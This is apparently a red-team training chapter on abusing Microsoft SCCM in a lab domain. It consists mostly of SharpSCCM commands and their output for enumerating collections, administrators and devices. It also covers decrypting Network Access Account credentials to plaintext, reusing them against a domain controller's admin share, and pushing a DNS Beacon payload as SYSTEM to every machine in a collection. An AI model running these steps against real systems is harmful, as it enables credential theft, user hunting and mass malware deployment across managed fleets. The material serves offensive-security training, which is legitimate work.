# Configuration Manager

Microsoft Configuration Manager (often shortened to ConfigMgr or MCM) started its life as "Systems Management Server" (SMS).  It became "Systems Center Configuration Manager" (SCCM), then "Endpoint Configuration Manager" (MECM), and is now under Microsoft's Intune brand umbrella.  Most still refer to it as SCCM because Microsoft change the name of their products more frequently than I change my socks. Fundamentally, SCCM's role is to help with system management tasks such as application & software deployments, updates and compliance configuration & reporting.

The complexity of a deployment can vary from a single site, to a sprawling hierarchy of multiple primary and secondary sites.  The ability to connect multiple sites helps with scalability, particularly when dealing with different geographic locations.  The examples below are taken directly from the Microsoft documentation.

SCCM is an attractive target for attackers because given enough privilege, it can be used to push malicious scripts and applications to devices that it manages.  The deployment in the RTO lab is only setup as a single site in order to demonstrate basic abuse primitives against Configuration Manager.  There are further resources out there, including this post by Chris Thompson that describes how a compromised primary site also compromises the entire hierarchy.

# Enumeration 

The first step when attacking SCCM is to get a feel for the deployment topology, which devices are being managed, and who the administrative users are.  Throughout this chapter, we'll use the SharpSCCM tool.  Given a foothold on a machine, we can begin by finding the management point and site code that it is linked to.  This does not require any special privileges in the domain, in SCCM or on the endpoint.

    run hostname 
    getuid
    execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe local site-info --no-banner

This enumeration uses WMI under the hood, which could be done manually.

    powershell Get-WmiObject -Class SMS_Authority -Namespace root\CCM | select Name, CurrentManagementPoint | fl

We can also check the DACL on the CN=System Management container in AD for machines that have Full Control over it (as this a pre-requisite of SCCM setup in a domain).

    execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get site-info -d cyberbotic.io --no-banner

Enumerating users, groups, computers, collections, and administrators, etc, does require some level of privilege in SCCM and cannot be done as a standard domain user.  SCCM employs an RBAC security model - the lowest role is "Read-Only Analyst" and the highest is "Full Administrator".  Lots of other roles exist such as "Asset Manager", "Infrastructure Administrator", and "Software Update Manager".  A description of each can be found here.  Furthermore, the "scope" of these roles can be restricted to individual collections as needed by the administrative user.  For example, computers from the DEV and CYBER domains have been grouped into their own collections.

This can really impact your view (as an attacker) of how SCCM is configured.  For example, if we enumerate all the collections as bfarmer, we can see that both DEV and CYBER exist as well as their member counts.

    getuid
    execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get collections --no-banner

However, if we run the same enumeration as jking, a member of DEV\Support Engineers, we only see the DEV collection.

    make_token DEV\jking Qwerty123
    execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get collections --no-banner

This is because even though DEV\Developers are only "Read-Only Analysts", the role is scoped to both collections.  DEV\Support Engineers are "Full Administrators" over the DEV collection but they have no roles that are scoped to the CYBER collection.
So when enumerating SCCM, you may only see a small slither based on the user you're running the enumeration as.
Administrative users can be found using get class-instances SMS_Admin.

    execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get class-instances SMS_Admin --no-banner

This allows us to see what is reflected in the Configuration Manger GUI above.  Members of these collections can be found using get collection-members -n <collection-name>.

    execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get collection-members -n DEV --no-banner

Even more information on each device can be obtained using get devices.  There are some good ways to filter the output, such as searching by device name, -n, and only displaying the properties specified by -p.

    execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get devices -n WKSTN -p Name -p FullDomainName -p IPAddresses -p LastLogonUserName -p OperatingSystemNameandVersion --no-banner

You can also use SCCM as a form of user hunting, since it records the last user to login to each managed computer.  The -u parameter will only return devices where the given user was the last to login.

  execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get devices -u nlamb -p IPAddresses -p IPSubnets -p Name --no-banner

However, take these results with a grain of salt because this information is only updated in SCCM every 7 days by default.

# Network Access Account Credentials

In a Windows environment, the majority of computers will be domain-joined and will therefore authenticate to SCCM Software Distribution Points (SDPs) (basically just SMB shares) using their own machine account credentials.  However, some computers may not be domain-joined.  Network Access Account credentials (NAAs) are domain credentials intended to be used by these machines to access the SDPs over the network.  They are passed to the machines as part of the SCCM machine policies, which are then encrypted using DPAPI and stored locally.  If they are present, privileged users can retrieve these credential blobs via WMI or directly from disk and decrypt them to recover plaintext credentials.
Use local naa with -m wmi or -m disk.

    getuid
    execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe local naa -m wmi --no-banner

    [+] Connecting to \\127.0.0.1\root\ccm\policy\Machine\ActualConfig
    [+] Retrieving network access account blobs via WMI
    [+] Retrieving task sequence blobs via WMI
    [+] Retrieving collection variable blobs via WMI
    
    [...snip...]
    
    [+] Decrypting network access account credentials
    
        NetworkAccessUsername: cyberbotic.io\sccm_svc
        NetworkAccessPassword: Cyberb0tic
      
These credentials should only have read access to the SDP, but are often times over privileged (sometimes even domain/enterprise admins).
    
    make_token cyberbotic.io\sccm_svc Cyberb0tic

    ls \\dc-1.cyberbotic.io\c$

An alternate approach is to request a copy of the policy directly from SCCM using get naa.  This also requires local admin on the local machine to obtain a copy of its SMS Signing and SMS Encryption certificates.

# Lateral Movement 

With Full or Application Administrator privileges over a device or a collection, we can deploy scripts or applications to aid in lateral movement.  To execute a command on every device in the DEV collection, we could do exec -n DEV -p <path>.

    execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe exec -n DEV -p C:\Windows\notepad.exe --no-banner

SharpSCCM attempts to hide the application (i.e. the command we're executing) from the GUI, but the deployment is still visible until it completes.

By default, the above will execute Notepad as the user currently logged into each machine.  If a user is not logged in, then the command won't execute.  We can force it to execute as SYSTEM using the -s parameter, and this will execute on every machine regardless of whether a user is currently logged in or not.  As with the GPO Abuse chapter, we can upload and execute a DNS Beacon payload.

    execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe exec -n DEV -p "C:\Windows\System32\cmd.exe /c start /b \\dc-2\software\dns_x64.exe" -s --no-banner
